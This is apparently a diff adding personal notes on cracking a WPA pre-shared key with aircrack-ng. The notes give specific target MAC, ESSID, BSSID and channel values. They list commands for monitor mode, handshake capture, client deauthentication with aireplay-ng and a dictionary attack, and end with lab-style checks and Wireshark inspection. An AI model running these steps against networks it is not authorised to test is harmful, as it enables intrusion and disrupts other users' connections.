@@ -1,0 +1,29 @@
+http://www.aircrack-ng.org/doku.php?id=cracking_wpa
+
+mac=00:C0:CA:40:B1:B8
+essid=actt
+bssid=00:25:9C:41:31:DE
+chan=9
+
+start wireless in monitor mode
+$ airmon-ng start wlan1 $chan
+
+grab the authentication handshake
+$ airodump-ng -c $chan --bssid $bssid -w psk mon0
+
+if no authentication handshake is captured when an existing wireless client is on the network, try deauthenticating the client
+$ aireplay-ng -0 1 -a $bssid -c $mac_client mon0
+
+crack the preshared key
+$ aircrack-ng -w password.lst -b $bssid psk*.cap
+
+once done stop all relaying, capturing and pinging
+stop wireless monitor mode
+$ airmon-ng stop wlan1
+$ airmon-ng stop mon0
+
+now try again with a password not in the dictionary
+and when it is not found, try adding it in the dictionary and cracking again
+
+then run wireshark and open the psk*.cap file to find eapol packets to see the encrypted key
+this is what aircrack uses to brute force the dictionary against
